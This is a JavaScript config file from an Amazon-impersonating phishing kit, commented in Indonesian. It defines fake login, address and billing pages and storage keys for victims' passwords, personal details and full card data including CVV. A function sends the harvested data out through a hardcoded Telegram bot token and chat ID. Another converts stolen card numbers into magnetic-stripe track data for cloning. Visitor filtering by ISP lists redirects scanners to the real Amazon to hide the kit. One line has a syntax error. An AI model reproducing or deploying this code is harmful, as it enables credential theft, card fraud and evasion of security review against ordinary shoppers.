// ==================================================
// XCHENBA — KONFIGURASI UTAMA
// ==================================================

// 🔹 TELEGRAM — Tujuan Pengiriman Data
export const TELEGRAM = {
  BOT_TOKEN: '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk',
  CHAT_ID: '7808815199'
};

// 🔹 EMAIL PENERIMA (jika ditambahkan fungsi kirim email)
export const EMAIL_PENERIMA = 'jandaanaksatu777@gmail.com';

// 🔹 TAUTAN TUJUAN
export const TAUTAN = {
  AMAZON_ASLI: 'https://www.amazon.com',
  AMAZON_HALAMAN: 'amazon.html',
  PASSWORD: 'password.html',
  ADDRESS: 'address.html',
  BILLING: 'billing.html',
  COMPLETED: 'completed.html',
  PANEL: 'panel-rahasia.html'
};

// 🔹 PENYIMPANAN LOKAL — Kunci Data
export const KUNCI_SIMPAN = {
  EMAIL: 'email_pengguna',
  KATA_SANDI: 'kata_sandi',
  NAMA_LENGKAP: 'nama_lengkap',
  TGL_LAHIR: 'tgl_lahir',
  KODE_TELP: 'kode_telp',
  NOMOR_TELP: 'nomor_telp',
  ALAMAT1: 'alamat1',
  ALAMAT2: 'alamat2',
  KOTA: 'kota',
  PROVINSI: 'provinsi',
  KODE_POS: 'kode_pos',
  NEGARA: 'negara',
  NAMA_KARTU: 'nama_kartu',
  NOMOR_KARTU: 'nomor_kartu',
  EXP_KARTU: 'exp_kartu',
  CVV_KARTU: 'cvv_kartu',
  PARAM_AKSES: 'pengaturan_param',
  DAFTAR_BLOKIR: 'daftar_blokir_isp',
  DAFTAR_IZINKAN: 'daftar_izinkan_isp',
  DATA_LOGIN: 'data_login_masuk',
  DATA_KARTU: 'data_kartu_masuk',
  DATA_BOT: 'data_bot_masuk'
};

// 🔹 FUNGSI BANTU — Ambil Info Pengunjung
export async function ambilInfoPengunjung() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const d = await res.json();
    return {
      ip: d.ip || '-',
      isp: d.org || d.isp || '-',
      negara: d.country_name || '-',
      kode_negara: d.country_code || 'ID',
      kota: d.city || '-',
      provinsi: d.region || '-',
      kode_pos: d.postal || '-',
      zona_waktu: d.timezone || '-'
    };
  } catch {
    return {
      ip: '-', isp: '-', negara: '-', kode_negara: 'ID',
      kota: '-', provinsi: '-', kode_pos: '-', zona_waktu: '-'
    };
  }
}

// 🔹 FUNGSI BANTU — Ambil Info Perangkat & Browser
export function ambilInfoPerangkat() {
  const ua = navigator.userAgent;
  let perangkat = 'Desktop';
  if (/Android|iPhone|iPad|iPod|Mobile/.test(ua)) perangkat = 'Mobile';
  
  let browser = 'Unknown';
  if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
  else if (/Firefox/.test(ua)) browser = 'Firefox';
  else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
  else if (/Edg/.test(ua)) browser = 'Edge';
  else if /Opera/.test(ua) browser = 'Opera';

  return { perangkat, browser, user_agent: ua };
}

// 🔹 FUNGSI — Kirim Pesan ke Telegram
export async function kirimTelegram(pesan) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM.CHAT_ID,
        text: pesan,
        parse_mode: 'Markdown'
      })
    });
    return true;
  } catch (err) {
    console.error('Gagal kirim ke Telegram:', err);
    return false;
  }
}

// 🔹 FUNGSI — Buat Track 1 & Track 2 dari Nomor Kartu
export function buatTrackData(nomorKartu, namaPemilik, expKartu) {
  const nomorBersih = nomorKartu.replace(/\s/g, '');
  const expBersih = expKartu.replace('/', '');
  
  // Format nama: NAMA/BELAKANG
  const namaBersih = namaPemilik.replace(/[^A-Za-z/ ]/g, '').toUpperCase().trim();
  const bagianNama = namaBersih.split(' ');
  const namaFormat = bagianNama.length >= 2 
    ? `${bagianNama[bagianNama.length - 1]}/${bagianNama.slice(0, -1).join(' ')}`
    : namaBersih || 'UNKNOWN/USER';
  
  const sisa = '0'.repeat(10);
  
  return {
    track1: `%B${nomorBersih}^${namaFormat}^${expBersih}${sisa}?`,
    track2: `;${nomorBersih}=${expBersih}${sisa}?`
  };
}

// 🔹 FUNGSI — Deteksi Bahasa Otomatis
export async function deteksiBahasa() {
  let kode = 'en';
  try {
    const res = await fetch('https://ipapi.co/json/');
    const d = await res.json();
    const c = d.country_code || 'ID';
    if (['JP'].includes(c)) kode = 'ja';
    else if (['CN'].includes(c)) kode = 'zh';
    else if (['TH'].includes(c)) kode = 'th';
    else if (['ID'].includes(c)) kode = 'id';
  } catch {
    kode = navigator.language.startsWith('ja') ? 'ja' :
           navigator.language.startsWith('zh') ? 'zh' :
           navigator.language.startsWith('th') ? 'th' :
           navigator.language.startsWith('id') ? 'id' : 'en';
  }
  return kode;
}

// 🔹 FUNGSI — Cek Akses Melalui Parameter & ISP
export async function cekIzinAkses() {
  const paramTersimpan = localStorage.getItem(KUNCI_SIMPAN.PARAM_AKSES);
  const daftarBlokir = (localStorage.getItem(KUNCI_SIMPAN.DAFTAR_BLOKIR) || '').toLowerCase();
  const daftarIzinkan = (localStorage.getItem(KUNCI_SIMPAN.DAFTAR_IZINKAN) || '').toLowerCase();
  
  // Cek parameter di URL
  const params = new URLSearchParams(window.location.search);
  let lolosParam = false;
  for (const [kunci, nilai] of params.entries()) {
    if (kunci === paramTersimpan && nilai === 'aktif') {
      lolosParam = true;
      break;
    }
  }

  // Ambil info pengunjung
  const info = await ambilInfoPengunjung();
  const isp = info.isp.toLowerCase();
  
  // Cek daftar blokir & izinkan
  const blokirArr = daftarBlokir.split(',').map(s => s.trim()).filter(Boolean);
  const izinkanArr = daftarIzinkan.split(',').map(s => s.trim()).filter(Boolean);
  
  const diblokir = blokirArr.some(nama => isp.includes(nama));
  const diizinkan = izinkanArr.length === 0 || izinkanArr.some(nama => isp.includes(nama));

  // Catat sebagai bot jika tidak lolos
  if (!lolosParam || diblokir || !diizinkan) {
    if (window.tambahBot) {
      window.tambahBot(info.ip, info.isp, info.negara);
    }
    window.location.href = TAUTAN.AMAZON_ASLI;
    return false;
  }
  return true;
}

// 🔹 FUNGSI — Simpan Data ke Panel
export function daftarKePanel() {
  return {
    login: {
      simpan: (email, ip, isp) => {
        const data = JSON.parse(localStorage.getItem(KUNCI_SIMPAN.DATA_LOGIN) || '[]');
        data.unshift({ email, ip, isp, waktu: new Date().toLocaleString('id-ID') });
        localStorage.setItem(KUNCI_SIMPAN.DATA_LOGIN, JSON.stringify(data));
      }
    },
    kartu: {
      simpan: (nama, nomorAkhir, ip) => {
        const data = JSON.parse(localStorage.getItem(KUNCI_SIMPAN.DATA_KARTU) || '[]');
        data.unshift({ nama, nomorAkhir, ip, waktu: new Date().toLocaleString('id-ID') });
        localStorage.setItem(KUNCI_SIMPAN.DATA_KARTU, JSON.stringify(data));
      }
    }
  };
}

console.log('%c✅ XCHENBA config.js dimuat berhasil', 'color: #90ee90; font-weight: bold;');
